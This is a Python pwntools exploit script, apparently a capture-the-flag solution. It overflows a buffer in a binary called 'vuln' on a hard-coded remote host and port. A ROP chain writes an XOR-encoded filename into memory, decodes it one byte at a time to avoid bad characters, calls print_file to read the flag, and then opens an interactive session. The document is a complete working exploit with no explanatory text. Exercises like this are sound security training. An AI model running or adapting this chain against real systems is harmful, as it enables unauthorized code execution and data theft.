from pwn import *

context.binary = elf = ELF("./vuln")
context.log_level = "info"

HOST = "13.127.119.28"
PORT = 1338

OFFSET = 88
WRITE_ADDR = 0x404068
ENCODED_NAME = b"dnce,vzv"
XOR_KEY = 0x02

TTY_QUOTE_BYTES = {
    0x03,
    0x04,
    0x11,
    0x12,
    0x13,
    0x15,
    0x16,
    0x17,
    0x1A,
    0x1C,
    0x7F,
}


def tty_quote(data: bytes) -> bytes:
    out = bytearray()
    for byte in data:
        if byte in TTY_QUOTE_BYTES:
            out.append(0x16)
        out.append(byte)
    return bytes(out)


def build_payload() -> bytes:
    pop_r12_r13_r14_r15 = elf.symbols["gadget_pop_r12_r13_r14_r15_ret"]
    pop_r14_r15 = elf.symbols["gadget_pop_r14_r15_ret"]
    mov_r13_r12 = elf.symbols["gadget_mov_r13_r12_ret"]
    xor_r15_r14b = elf.symbols["gadget_xor_r15_r14b_ret"]
    pop_rdi = elf.symbols["gadget_pop_rdi_ret"]
    print_file = elf.plt["print_file"]

    payload = flat(
        b"A" * OFFSET,
        pop_r12_r13_r14_r15,
        ENCODED_NAME,
        WRITE_ADDR,
        0,
        0,
        mov_r13_r12,
    )

    for index in range(len(ENCODED_NAME)):
        payload += flat(
            pop_r14_r15,
            XOR_KEY,
            WRITE_ADDR + index,
            xor_r15_r14b,
        )

    payload += flat(
        pop_rdi,
        WRITE_ADDR,
        print_file,
    )
    return payload


def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"Input: ")
    io.send(tty_quote(build_payload()) + b"\n")
    io.interactive()


if __name__ == "__main__":
    main()
